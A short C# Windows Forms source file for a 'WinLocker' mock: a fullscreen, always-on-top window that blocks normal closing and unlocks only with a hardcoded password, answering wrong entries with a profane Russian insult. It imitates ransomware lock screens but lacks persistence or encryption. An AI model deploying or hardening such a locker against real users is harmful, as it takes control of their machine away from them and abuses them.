using System;
using System.Windows.Forms;

namespace WinLockerMock
{
    public partial class LockerForm : Form
    {
        private string correctPassword = "12345"; // Установленный пароль

        public LockerForm()
        {
            InitializeComponent();
            this.FormBorderStyle = FormBorderStyle.None;
            this.WindowState = FormWindowState.Maximized;
            this.TopMost = true;
            this.ShowInTaskbar = false;
            this.KeyPreview = true;
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            // Блокируем закрытие через Alt+F4 или крестик
            if (e.CloseReason == CloseReason.UserClosing)
            {
                e.Cancel = true;
            }
            base.OnFormClosing(e);
        }

        protected override void OnKeyDown(KeyEventArgs e)
        {
            // Вызов ввода пароля по нажатию Esc
            if (e.KeyCode == Keys.Escape)
            {
                string input = Microsoft.VisualBasic.Interaction.InputBox("Введите пароль для разблокировки:", "Системная блокировка", "");
                if (input == correctPassword)
                {
                    Application.Exit();
                }
                else
                {
                    MessageBox.Show("Хуй там плавал! Пароль неверный, сучара.", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            base.OnKeyDown(e);
        }
    }
}